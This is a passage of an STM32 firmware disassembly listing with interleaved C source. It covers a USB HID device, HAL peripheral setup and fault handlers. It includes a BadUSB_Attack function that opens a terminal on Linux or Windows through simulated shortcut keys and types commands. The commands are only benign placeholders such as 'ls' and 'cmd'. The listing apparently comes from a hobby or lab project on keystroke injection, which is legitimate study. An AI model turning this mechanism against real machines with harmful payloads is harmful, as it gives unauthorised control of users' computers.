 8000a5a:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000a5e:	695b      	ldr	r3, [r3, #20]
 8000a60:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000a64:	f043 0301 	orr.w	r3, r3, #1
 8000a68:	6153      	str	r3, [r2, #20]
		//Second entry interrupt
		MX_TIM2_Init();
 8000a6a:	f000 f9ef 	bl	8000e4c <MX_TIM2_Init>
		HAL_TIM_Base_Start_IT(&htim2);
 8000a6e:	4803      	ldr	r0, [pc, #12]	; (8000a7c <InterruptTrap+0x38>)
 8000a70:	f004 f938 	bl	8004ce4 <HAL_TIM_Base_Start_IT>
	}
}
 8000a74:	bf00      	nop
 8000a76:	3708      	adds	r7, #8
 8000a78:	46bd      	mov	sp, r7
 8000a7a:	bd80      	pop	{r7, pc}
 8000a7c:	200002e4 	.word	0x200002e4

08000a80 <BadUSB_Attack>:

void BadUSB_Attack(int type){//type = 0:Linux; type = 1:windows.
 8000a80:	b580      	push	{r7, lr}
 8000a82:	f5ad 7d04 	sub.w	sp, sp, #528	; 0x210
 8000a86:	af00      	add	r7, sp, #0
 8000a88:	f507 7304 	add.w	r3, r7, #528	; 0x210
 8000a8c:	f5a3 7303 	sub.w	r3, r3, #524	; 0x20c
 8000a90:	6018      	str	r0, [r3, #0]
	if(type == 0){
 8000a92:	f507 7304 	add.w	r3, r7, #528	; 0x210
 8000a96:	f5a3 7303 	sub.w	r3, r3, #524	; 0x20c
 8000a9a:	681b      	ldr	r3, [r3, #0]
 8000a9c:	2b00      	cmp	r3, #0
 8000a9e:	d129      	bne.n	8000af4 <BadUSB_Attack+0x74>
		uint8_t StartLinuxTerminal[3] = {130, 131, 'T'};
 8000aa0:	4a41      	ldr	r2, [pc, #260]	; (8000ba8 <BadUSB_Attack+0x128>)
 8000aa2:	f507 7303 	add.w	r3, r7, #524	; 0x20c
 8000aa6:	6812      	ldr	r2, [r2, #0]
 8000aa8:	4611      	mov	r1, r2
 8000aaa:	8019      	strh	r1, [r3, #0]
 8000aac:	3302      	adds	r3, #2
 8000aae:	0c12      	lsrs	r2, r2, #16
 8000ab0:	701a      	strb	r2, [r3, #0]
		char AttackStr[256];
		strcpy(AttackStr, "ls\n\nexit\n\n");
 8000ab2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000ab6:	4a3d      	ldr	r2, [pc, #244]	; (8000bac <BadUSB_Attack+0x12c>)
 8000ab8:	ca07      	ldmia	r2, {r0, r1, r2}
 8000aba:	c303      	stmia	r3!, {r0, r1}
 8000abc:	801a      	strh	r2, [r3, #0]
 8000abe:	3302      	adds	r3, #2
 8000ac0:	0c12      	lsrs	r2, r2, #16
 8000ac2:	701a      	strb	r2, [r3, #0]
		SimulateShortcutKey(StartLinuxTerminal, 3);
 8000ac4:	f507 7303 	add.w	r3, r7, #524	; 0x20c
 8000ac8:	2103      	movs	r1, #3
 8000aca:	4618      	mov	r0, r3
 8000acc:	f7ff ff24 	bl	8000918 <SimulateShortcutKey>
		HAL_Delay(1000);
 8000ad0:	f44f 707a 	mov.w	r0, #1000	; 0x3e8
 8000ad4:	f000 fb64 	bl	80011a0 <HAL_Delay>
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 8000ad8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000adc:	4618      	mov	r0, r3
 8000ade:	f7ff fb75 	bl	80001cc <strlen>
 8000ae2:	4603      	mov	r3, r0
 8000ae4:	4619      	mov	r1, r3
 8000ae6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000aea:	4a31      	ldr	r2, [pc, #196]	; (8000bb0 <BadUSB_Attack+0x130>)
 8000aec:	4618      	mov	r0, r3
 8000aee:	f7ff ff3f 	bl	8000970 <SimulateKeyStrokes>
	}else{    //test
		char AttackStr[256];
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
	}
}
 8000af2:	e054      	b.n	8000b9e <BadUSB_Attack+0x11e>
	}else if(type == 1){
 8000af4:	f507 7304 	add.w	r3, r7, #528	; 0x210
 8000af8:	f5a3 7303 	sub.w	r3, r3, #524	; 0x20c
 8000afc:	681b      	ldr	r3, [r3, #0]
 8000afe:	2b01      	cmp	r3, #1
 8000b00:	d137      	bne.n	8000b72 <BadUSB_Attack+0xf2>
		uint8_t StartWindowsTerminal[2] = {132, 'R'};
 8000b02:	f245 2384 	movw	r3, #21124	; 0x5284
 8000b06:	f8a7 3208 	strh.w	r3, [r7, #520]	; 0x208
		strcpy(AttackStr, "cmd\n");
 8000b0a:	f107 0308 	add.w	r3, r7, #8
 8000b0e:	4a29      	ldr	r2, [pc, #164]	; (8000bb4 <BadUSB_Attack+0x134>)
 8000b10:	e892 0003 	ldmia.w	r2, {r0, r1}
 8000b14:	6018      	str	r0, [r3, #0]
 8000b16:	3304      	adds	r3, #4
 8000b18:	7019      	strb	r1, [r3, #0]
		strcpy(AttackStr1, "ls -a\n\n");
 8000b1a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000b1e:	4a26      	ldr	r2, [pc, #152]	; (8000bb8 <BadUSB_Attack+0x138>)
 8000b20:	e892 0003 	ldmia.w	r2, {r0, r1}
 8000b24:	e883 0003 	stmia.w	r3, {r0, r1}
		SimulateShortcutKey(StartWindowsTerminal, 2);
 8000b28:	f507 7302 	add.w	r3, r7, #520	; 0x208
 8000b2c:	2102      	movs	r1, #2
 8000b2e:	4618      	mov	r0, r3
 8000b30:	f7ff fef2 	bl	8000918 <SimulateShortcutKey>
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 8000b34:	f107 0308 	add.w	r3, r7, #8
 8000b38:	4618      	mov	r0, r3
 8000b3a:	f7ff fb47 	bl	80001cc <strlen>
 8000b3e:	4603      	mov	r3, r0
 8000b40:	4619      	mov	r1, r3
 8000b42:	f107 0308 	add.w	r3, r7, #8
 8000b46:	4a1a      	ldr	r2, [pc, #104]	; (8000bb0 <BadUSB_Attack+0x130>)
 8000b48:	4618      	mov	r0, r3
 8000b4a:	f7ff ff11 	bl	8000970 <SimulateKeyStrokes>
		HAL_Delay(1000);
 8000b4e:	f44f 707a 	mov.w	r0, #1000	; 0x3e8
 8000b52:	f000 fb25 	bl	80011a0 <HAL_Delay>
		SimulateKeyStrokes(AttackStr1, strlen(AttackStr1), &PrintCnt);
 8000b56:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000b5a:	4618      	mov	r0, r3
 8000b5c:	f7ff fb36 	bl	80001cc <strlen>
 8000b60:	4603      	mov	r3, r0
 8000b62:	4619      	mov	r1, r3
 8000b64:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000b68:	4a11      	ldr	r2, [pc, #68]	; (8000bb0 <BadUSB_Attack+0x130>)
 8000b6a:	4618      	mov	r0, r3
 8000b6c:	f7ff ff00 	bl	8000970 <SimulateKeyStrokes>
}
 8000b70:	e015      	b.n	8000b9e <BadUSB_Attack+0x11e>
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
 8000b72:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000b76:	4a11      	ldr	r2, [pc, #68]	; (8000bbc <BadUSB_Attack+0x13c>)
 8000b78:	4618      	mov	r0, r3
 8000b7a:	4611      	mov	r1, r2
 8000b7c:	234e      	movs	r3, #78	; 0x4e
 8000b7e:	461a      	mov	r2, r3
 8000b80:	f00c fa44 	bl	800d00c <memcpy>
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 8000b84:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000b88:	4618      	mov	r0, r3
 8000b8a:	f7ff fb1f 	bl	80001cc <strlen>
 8000b8e:	4603      	mov	r3, r0
 8000b90:	4619      	mov	r1, r3
 8000b92:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000b96:	4a06      	ldr	r2, [pc, #24]	; (8000bb0 <BadUSB_Attack+0x130>)
 8000b98:	4618      	mov	r0, r3
 8000b9a:	f7ff fee9 	bl	8000970 <SimulateKeyStrokes>
}
 8000b9e:	bf00      	nop
 8000ba0:	f507 7704 	add.w	r7, r7, #528	; 0x210
 8000ba4:	46bd      	mov	sp, r7
 8000ba6:	bd80      	pop	{r7, pc}
 8000ba8:	0800d134 	.word	0x0800d134
 8000bac:	0800d0c8 	.word	0x0800d0c8
 8000bb0:	20000278 	.word	0x20000278
 8000bb4:	0800d0d4 	.word	0x0800d0d4
 8000bb8:	0800d0dc 	.word	0x0800d0dc
 8000bbc:	0800d0e4 	.word	0x0800d0e4

08000bc0 <HAL_TIM_PeriodElapsedCallback>:

void HAL_TIM_PeriodElapsedCallback(TIM_HandleTypeDef *htim){
 8000bc0:	b580      	push	{r7, lr}
 8000bc2:	b082      	sub	sp, #8
 8000bc4:	af00      	add	r7, sp, #0
 8000bc6:	6078      	str	r0, [r7, #4]
	if(htim == &htim2){
 8000bc8:	687b      	ldr	r3, [r7, #4]
 8000bca:	4a1d      	ldr	r2, [pc, #116]	; (8000c40 <HAL_TIM_PeriodElapsedCallback+0x80>)
 8000bcc:	4293      	cmp	r3, r2
 8000bce:	d133      	bne.n	8000c38 <HAL_TIM_PeriodElapsedCallback+0x78>
		if(InterruptCnt == 0){
 8000bd0:	4b1c      	ldr	r3, [pc, #112]	; (8000c44 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000bd2:	681b      	ldr	r3, [r3, #0]
 8000bd4:	2b00      	cmp	r3, #0
 8000bd6:	d108      	bne.n	8000bea <HAL_TIM_PeriodElapsedCallback+0x2a>
			//Simulate press operation
			Get_Single_Descriptor(128);
 8000bd8:	2080      	movs	r0, #128	; 0x80
 8000bda:	f7ff fdb1 	bl	8000740 <Get_Single_Descriptor>
			USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000bde:	220f      	movs	r2, #15
 8000be0:	4919      	ldr	r1, [pc, #100]	; (8000c48 <HAL_TIM_PeriodElapsedCallback+0x88>)
 8000be2:	481a      	ldr	r0, [pc, #104]	; (8000c4c <HAL_TIM_PeriodElapsedCallback+0x8c>)
 8000be4:	f007 feec 	bl	80089c0 <USBD_CUSTOM_HID_SendReport>
 8000be8:	e018      	b.n	8000c1c <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_SET);
		}else if(InterruptCnt == 1){
 8000bea:	4b16      	ldr	r3, [pc, #88]	; (8000c44 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000bec:	681b      	ldr	r3, [r3, #0]
 8000bee:	2b01      	cmp	r3, #1
 8000bf0:	d10c      	bne.n	8000c0c <HAL_TIM_PeriodElapsedCallback+0x4c>
			//Simulate release operation
			SimulateKeyRelease();
 8000bf2:	f7ff fe69 	bl	80008c8 <SimulateKeyRelease>
			//Judging whether to Interrupt
			if((recv_buffer[0]&0x02) != 0x02)
 8000bf6:	4b16      	ldr	r3, [pc, #88]	; (8000c50 <HAL_TIM_PeriodElapsedCallback+0x90>)
 8000bf8:	781b      	ldrb	r3, [r3, #0]
 8000bfa:	f003 0302 	and.w	r3, r3, #2
 8000bfe:	2b00      	cmp	r3, #0
 8000c00:	d10c      	bne.n	8000c1c <HAL_TIM_PeriodElapsedCallback+0x5c>
				InterruptCnt = -1;
 8000c02:	4b10      	ldr	r3, [pc, #64]	; (8000c44 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c04:	f04f 32ff 	mov.w	r2, #4294967295
 8000c08:	601a      	str	r2, [r3, #0]
 8000c0a:	e007      	b.n	8000c1c <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_RESET);
		}else{
			//off timer
			TIM2->CR1 &= ~TIM_CR1_CEN;
 8000c0c:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000c10:	681b      	ldr	r3, [r3, #0]
 8000c12:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000c16:	f023 0301 	bic.w	r3, r3, #1
 8000c1a:	6013      	str	r3, [r2, #0]
		}
		InterruptCnt = (InterruptCnt+1)%3;
 8000c1c:	4b09      	ldr	r3, [pc, #36]	; (8000c44 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c1e:	681b      	ldr	r3, [r3, #0]
 8000c20:	1c59      	adds	r1, r3, #1
 8000c22:	4b0c      	ldr	r3, [pc, #48]	; (8000c54 <HAL_TIM_PeriodElapsedCallback+0x94>)
 8000c24:	fb83 3201 	smull	r3, r2, r3, r1
 8000c28:	17cb      	asrs	r3, r1, #31
 8000c2a:	1ad2      	subs	r2, r2, r3
 8000c2c:	4613      	mov	r3, r2
 8000c2e:	005b      	lsls	r3, r3, #1
 8000c30:	4413      	add	r3, r2
 8000c32:	1aca      	subs	r2, r1, r3
 8000c34:	4b03      	ldr	r3, [pc, #12]	; (8000c44 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c36:	601a      	str	r2, [r3, #0]
	}
}
 8000c38:	bf00      	nop
 8000c3a:	3708      	adds	r7, #8
 8000c3c:	46bd      	mov	sp, r7
 8000c3e:	bd80      	pop	{r7, pc}
 8000c40:	200002e4 	.word	0x200002e4
 8000c44:	20000274 	.word	0x20000274
 8000c48:	2000025c 	.word	0x2000025c
 8000c4c:	200003c0 	.word	0x200003c0
 8000c50:	2000026c 	.word	0x2000026c
 8000c54:	55555556 	.word	0x55555556

08000c58 <Error_Handler>:
/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
 8000c58:	b480      	push	{r7}
 8000c5a:	af00      	add	r7, sp, #0
  \details Disables IRQ interrupts by setting the I-bit in the CPSR.
           Can only be executed in Privileged modes.
 */
__STATIC_FORCEINLINE void __disable_irq(void)
{
  __ASM volatile ("cpsid i" : : : "memory");
 8000c5c:	b672      	cpsid	i
}
 8000c5e:	bf00      	nop
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */
  __disable_irq();
  while (1)
 8000c60:	e7fe      	b.n	8000c60 <Error_Handler+0x8>
	...

08000c64 <MX_SPI1_Init>:

SPI_HandleTypeDef hspi1;

/* SPI1 init function */
void MX_SPI1_Init(void)
{
 8000c64:	b580      	push	{r7, lr}
 8000c66:	af00      	add	r7, sp, #0
  /* USER CODE END SPI1_Init 0 */

  /* USER CODE BEGIN SPI1_Init 1 */

  /* USER CODE END SPI1_Init 1 */
  hspi1.Instance = SPI1;
 8000c68:	4b1b      	ldr	r3, [pc, #108]	; (8000cd8 <MX_SPI1_Init+0x74>)
 8000c6a:	4a1c      	ldr	r2, [pc, #112]	; (8000cdc <MX_SPI1_Init+0x78>)
 8000c6c:	601a      	str	r2, [r3, #0]
  hspi1.Init.Mode = SPI_MODE_MASTER;
 8000c6e:	4b1a      	ldr	r3, [pc, #104]	; (8000cd8 <MX_SPI1_Init+0x74>)
 8000c70:	f44f 7282 	mov.w	r2, #260	; 0x104
 8000c74:	605a      	str	r2, [r3, #4]
  hspi1.Init.Direction = SPI_DIRECTION_2LINES;
 8000c76:	4b18      	ldr	r3, [pc, #96]	; (8000cd8 <MX_SPI1_Init+0x74>)
 8000c78:	2200      	movs	r2, #0
 8000c7a:	609a      	str	r2, [r3, #8]
  hspi1.Init.DataSize = SPI_DATASIZE_8BIT;
 8000c7c:	4b16      	ldr	r3, [pc, #88]	; (8000cd8 <MX_SPI1_Init+0x74>)
 8000c7e:	f44f 62e0 	mov.w	r2, #1792	; 0x700
 8000c82:	60da      	str	r2, [r3, #12]
  hspi1.Init.CLKPolarity = SPI_POLARITY_LOW;
 8000c84:	4b14      	ldr	r3, [pc, #80]	; (8000cd8 <MX_SPI1_Init+0x74>)
 8000c86:	2200      	movs	r2, #0
 8000c88:	611a      	str	r2, [r3, #16]
  hspi1.Init.CLKPhase = SPI_PHASE_1EDGE;
 8000c8a:	4b13      	ldr	r3, [pc, #76]	; (8000cd8 <MX_SPI1_Init+0x74>)
 8000c8c:	2200      	movs	r2, #0
 8000c8e:	615a      	str	r2, [r3, #20]
  hspi1.Init.NSS = SPI_NSS_SOFT;
 8000c90:	4b11      	ldr	r3, [pc, #68]	; (8000cd8 <MX_SPI1_Init+0x74>)
 8000c92:	f44f 7200 	mov.w	r2, #512	; 0x200
 8000c96:	619a      	str	r2, [r3, #24]
  hspi1.Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_64;
 8000c98:	4b0f      	ldr	r3, [pc, #60]	; (8000cd8 <MX_SPI1_Init+0x74>)
 8000c9a:	2228      	movs	r2, #40	; 0x28
 8000c9c:	61da      	str	r2, [r3, #28]
  hspi1.Init.FirstBit = SPI_FIRSTBIT_MSB;
 8000c9e:	4b0e      	ldr	r3, [pc, #56]	; (8000cd8 <MX_SPI1_Init+0x74>)
 8000ca0:	2200      	movs	r2, #0
 8000ca2:	621a      	str	r2, [r3, #32]
  hspi1.Init.TIMode = SPI_TIMODE_DISABLE;
 8000ca4:	4b0c      	ldr	r3, [pc, #48]	; (8000cd8 <MX_SPI1_Init+0x74>)
 8000ca6:	2200      	movs	r2, #0
 8000ca8:	625a      	str	r2, [r3, #36]	; 0x24
  hspi1.Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8000caa:	4b0b      	ldr	r3, [pc, #44]	; (8000cd8 <MX_SPI1_Init+0x74>)
 8000cac:	2200      	movs	r2, #0
 8000cae:	629a      	str	r2, [r3, #40]	; 0x28
  hspi1.Init.CRCPolynomial = 7;
 8000cb0:	4b09      	ldr	r3, [pc, #36]	; (8000cd8 <MX_SPI1_Init+0x74>)
 8000cb2:	2207      	movs	r2, #7
 8000cb4:	62da      	str	r2, [r3, #44]	; 0x2c
  hspi1.Init.CRCLength = SPI_CRC_LENGTH_DATASIZE;
 8000cb6:	4b08      	ldr	r3, [pc, #32]	; (8000cd8 <MX_SPI1_Init+0x74>)
 8000cb8:	2200      	movs	r2, #0
 8000cba:	631a      	str	r2, [r3, #48]	; 0x30
  hspi1.Init.NSSPMode = SPI_NSS_PULSE_ENABLE;
 8000cbc:	4b06      	ldr	r3, [pc, #24]	; (8000cd8 <MX_SPI1_Init+0x74>)
 8000cbe:	2208      	movs	r2, #8
 8000cc0:	635a      	str	r2, [r3, #52]	; 0x34
  if (HAL_SPI_Init(&hspi1) != HAL_OK)
 8000cc2:	4805      	ldr	r0, [pc, #20]	; (8000cd8 <MX_SPI1_Init+0x74>)
 8000cc4:	f003 ff14 	bl	8004af0 <HAL_SPI_Init>
 8000cc8:	4603      	mov	r3, r0
 8000cca:	2b00      	cmp	r3, #0
 8000ccc:	d001      	beq.n	8000cd2 <MX_SPI1_Init+0x6e>
  {
    Error_Handler();
 8000cce:	f7ff ffc3 	bl	8000c58 <Error_Handler>
  }
  /* USER CODE BEGIN SPI1_Init 2 */

  /* USER CODE END SPI1_Init 2 */

}
 8000cd2:	bf00      	nop
 8000cd4:	bd80      	pop	{r7, pc}
 8000cd6:	bf00      	nop
 8000cd8:	20000280 	.word	0x20000280
 8000cdc:	40013000 	.word	0x40013000

08000ce0 <HAL_SPI_MspInit>:

void HAL_SPI_MspInit(SPI_HandleTypeDef* spiHandle)
{
 8000ce0:	b580      	push	{r7, lr}
 8000ce2:	b08a      	sub	sp, #40	; 0x28
 8000ce4:	af00      	add	r7, sp, #0
 8000ce6:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8000ce8:	f107 0314 	add.w	r3, r7, #20
 8000cec:	2200      	movs	r2, #0
 8000cee:	601a      	str	r2, [r3, #0]
 8000cf0:	605a      	str	r2, [r3, #4]
 8000cf2:	609a      	str	r2, [r3, #8]
 8000cf4:	60da      	str	r2, [r3, #12]
 8000cf6:	611a      	str	r2, [r3, #16]
  if(spiHandle->Instance==SPI1)
 8000cf8:	687b      	ldr	r3, [r7, #4]
 8000cfa:	681b      	ldr	r3, [r3, #0]
 8000cfc:	4a17      	ldr	r2, [pc, #92]	; (8000d5c <HAL_SPI_MspInit+0x7c>)
 8000cfe:	4293      	cmp	r3, r2
 8000d00:	d128      	bne.n	8000d54 <HAL_SPI_MspInit+0x74>
  {
  /* USER CODE BEGIN SPI1_MspInit 0 */

  /* USER CODE END SPI1_MspInit 0 */
    /* SPI1 clock enable */
    __HAL_RCC_SPI1_CLK_ENABLE();
 8000d02:	4b17      	ldr	r3, [pc, #92]	; (8000d60 <HAL_SPI_MspInit+0x80>)
 8000d04:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000d06:	4a16      	ldr	r2, [pc, #88]	; (8000d60 <HAL_SPI_MspInit+0x80>)
 8000d08:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 8000d0c:	6613      	str	r3, [r2, #96]	; 0x60
 8000d0e:	4b14      	ldr	r3, [pc, #80]	; (8000d60 <HAL_SPI_MspInit+0x80>)
 8000d10:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000d12:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 8000d16:	613b      	str	r3, [r7, #16]
 8000d18:	693b      	ldr	r3, [r7, #16]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 8000d1a:	4b11      	ldr	r3, [pc, #68]	; (8000d60 <HAL_SPI_MspInit+0x80>)
 8000d1c:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000d1e:	4a10      	ldr	r2, [pc, #64]	; (8000d60 <HAL_SPI_MspInit+0x80>)
 8000d20:	f043 0301 	orr.w	r3, r3, #1
 8000d24:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000d26:	4b0e      	ldr	r3, [pc, #56]	; (8000d60 <HAL_SPI_MspInit+0x80>)
 8000d28:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000d2a:	f003 0301 	and.w	r3, r3, #1
 8000d2e:	60fb      	str	r3, [r7, #12]
 8000d30:	68fb      	ldr	r3, [r7, #12]
    /**SPI1 GPIO Configuration
    PA1     ------> SPI1_SCK
    PA6     ------> SPI1_MISO
    PA7     ------> SPI1_MOSI
    */
    GPIO_InitStruct.Pin = GPIO_PIN_1|GPIO_PIN_6|GPIO_PIN_7;
 8000d32:	23c2      	movs	r3, #194	; 0xc2
 8000d34:	617b      	str	r3, [r7, #20]
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8000d36:	2302      	movs	r3, #2
 8000d38:	61bb      	str	r3, [r7, #24]
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000d3a:	2300      	movs	r3, #0
 8000d3c:	61fb      	str	r3, [r7, #28]
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8000d3e:	2303      	movs	r3, #3
 8000d40:	623b      	str	r3, [r7, #32]
    GPIO_InitStruct.Alternate = GPIO_AF5_SPI1;
 8000d42:	2305      	movs	r3, #5
 8000d44:	627b      	str	r3, [r7, #36]	; 0x24
    HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);
 8000d46:	f107 0314 	add.w	r3, r7, #20
 8000d4a:	4619      	mov	r1, r3
 8000d4c:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000d50:	f000 fdd4 	bl	80018fc <HAL_GPIO_Init>

  /* USER CODE BEGIN SPI1_MspInit 1 */

  /* USER CODE END SPI1_MspInit 1 */
  }
}
 8000d54:	bf00      	nop
 8000d56:	3728      	adds	r7, #40	; 0x28
 8000d58:	46bd      	mov	sp, r7
 8000d5a:	bd80      	pop	{r7, pc}
 8000d5c:	40013000 	.word	0x40013000
 8000d60:	40021000 	.word	0x40021000

08000d64 <HAL_MspInit>:
/* USER CODE END 0 */
/**
  * Initializes the Global MSP.
  */
void HAL_MspInit(void)
{
 8000d64:	b480      	push	{r7}
 8000d66:	b083      	sub	sp, #12
 8000d68:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MspInit 0 */

  /* USER CODE END MspInit 0 */

  __HAL_RCC_SYSCFG_CLK_ENABLE();
 8000d6a:	4b0f      	ldr	r3, [pc, #60]	; (8000da8 <HAL_MspInit+0x44>)
 8000d6c:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000d6e:	4a0e      	ldr	r2, [pc, #56]	; (8000da8 <HAL_MspInit+0x44>)
 8000d70:	f043 0301 	orr.w	r3, r3, #1
 8000d74:	6613      	str	r3, [r2, #96]	; 0x60
 8000d76:	4b0c      	ldr	r3, [pc, #48]	; (8000da8 <HAL_MspInit+0x44>)
 8000d78:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000d7a:	f003 0301 	and.w	r3, r3, #1
 8000d7e:	607b      	str	r3, [r7, #4]
 8000d80:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_PWR_CLK_ENABLE();
 8000d82:	4b09      	ldr	r3, [pc, #36]	; (8000da8 <HAL_MspInit+0x44>)
 8000d84:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000d86:	4a08      	ldr	r2, [pc, #32]	; (8000da8 <HAL_MspInit+0x44>)
 8000d88:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8000d8c:	6593      	str	r3, [r2, #88]	; 0x58
 8000d8e:	4b06      	ldr	r3, [pc, #24]	; (8000da8 <HAL_MspInit+0x44>)
 8000d90:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000d92:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8000d96:	603b      	str	r3, [r7, #0]
 8000d98:	683b      	ldr	r3, [r7, #0]
  /* System interrupt init*/

  /* USER CODE BEGIN MspInit 1 */

  /* USER CODE END MspInit 1 */
}
 8000d9a:	bf00      	nop
 8000d9c:	370c      	adds	r7, #12
 8000d9e:	46bd      	mov	sp, r7
 8000da0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000da4:	4770      	bx	lr
 8000da6:	bf00      	nop
 8000da8:	40021000 	.word	0x40021000

08000dac <NMI_Handler>:
/******************************************************************************/
/**
  * @brief This function handles Non maskable interrupt.
  */
void NMI_Handler(void)
{
 8000dac:	b480      	push	{r7}
 8000dae:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN NonMaskableInt_IRQn 0 */

  /* USER CODE END NonMaskableInt_IRQn 0 */
  /* USER CODE BEGIN NonMaskableInt_IRQn 1 */
   while (1)
 8000db0:	e7fe      	b.n	8000db0 <NMI_Handler+0x4>

08000db2 <HardFault_Handler>:

/**
  * @brief This function handles Hard fault interrupt.
  */
void HardFault_Handler(void)
{
 8000db2:	b480      	push	{r7}
 8000db4:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN HardFault_IRQn 0 */

  /* USER CODE END HardFault_IRQn 0 */
  while (1)
 8000db6:	e7fe      	b.n	8000db6 <HardFault_Handler+0x4>

08000db8 <MemManage_Handler>:

/**
  * @brief This function handles Memory management fault.
  */
void MemManage_Handler(void)
{
 8000db8:	b480      	push	{r7}
 8000dba:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MemoryManagement_IRQn 0 */

  /* USER CODE END MemoryManagement_IRQn 0 */
  while (1)
 8000dbc:	e7fe      	b.n	8000dbc <MemManage_Handler+0x4>

08000dbe <BusFault_Handler>:

/**
  * @brief This function handles Prefetch fault, memory access fault.
  */
void BusFault_Handler(void)
{
 8000dbe:	b480      	push	{r7}
 8000dc0:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN BusFault_IRQn 0 */

  /* USER CODE END BusFault_IRQn 0 */
  while (1)
 8000dc2:	e7fe      	b.n	8000dc2 <BusFault_Handler+0x4>

08000dc4 <UsageFault_Handler>:

/**
  * @brief This function handles Undefined instruction or illegal state.
  */
void UsageFault_Handler(void)
{
 8000dc4:	b480      	push	{r7}
 8000dc6:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN UsageFault_IRQn 0 */

  /* USER CODE END UsageFault_IRQn 0 */
  while (1)
 8000dc8:	e7fe      	b.n	8000dc8 <UsageFault_Handler+0x4>

08000dca <SVC_Handler>:

/**
  * @brief This function handles System service call via SWI instruction.
  */
void SVC_Handler(void)
{
 8000dca:	b480      	push	{r7}
 8000dcc:	af00      	add	r7, sp, #0

  /* USER CODE END SVCall_IRQn 0 */
  /* USER CODE BEGIN SVCall_IRQn 1 */

  /* USER CODE END SVCall_IRQn 1 */
}
 8000dce:	bf00      	nop
 8000dd0:	46bd      	mov	sp, r7
 8000dd2:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000dd6:	4770      	bx	lr

08000dd8 <DebugMon_Handler>:

/**
  * @brief This function handles Debug monitor.
  */
void DebugMon_Handler(void)
{
 8000dd8:	b480      	push	{r7}
 8000dda:	af00      	add	r7, sp, #0

  /* USER CODE END DebugMonitor_IRQn 0 */
  /* USER CODE BEGIN DebugMonitor_IRQn 1 */

  /* USER CODE END DebugMonitor_IRQn 1 */
}
 8000ddc:	bf00      	nop
 8000dde:	46bd      	mov	sp, r7
 8000de0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000de4:	4770      	bx	lr

08000de6 <PendSV_Handler>:

/**
  * @brief This function handles Pendable request for system service.
  */
void PendSV_Handler(void)
{
 8000de6:	b480      	push	{r7}
 8000de8:	af00      	add	r7, sp, #0

  /* USER CODE END PendSV_IRQn 0 */
  /* USER CODE BEGIN PendSV_IRQn 1 */

  /* USER CODE END PendSV_IRQn 1 */
}
 8000dea:	bf00      	nop
 8000dec:	46bd      	mov	sp, r7
 8000dee:	f85d 7b04 	ldr.w	r7, [sp], #4
